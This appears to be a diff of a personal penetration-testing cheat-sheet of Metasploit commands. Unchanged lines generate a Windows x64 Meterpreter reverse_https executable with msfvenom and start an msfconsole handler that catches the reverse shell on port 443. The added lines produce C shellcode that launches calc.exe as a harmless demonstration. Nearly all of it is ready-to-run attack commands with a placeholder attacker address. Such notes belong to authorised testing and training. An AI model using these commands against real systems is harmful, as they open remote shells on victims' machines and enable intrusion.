@@ -4,3 +4,6 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=443 -f exe -o
 # One-liner Meterpreter listener Windows x64
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST <ip>; set LPORT 443; exploit" 
 $ ip: ip addr | grep -Po 'inet \K[\d.]+'
+
+# Create shellcode for C to spawn a calculator
+msfvenom -p windows/x64/exec CMD=calc.exe -f c -o shellcode.c
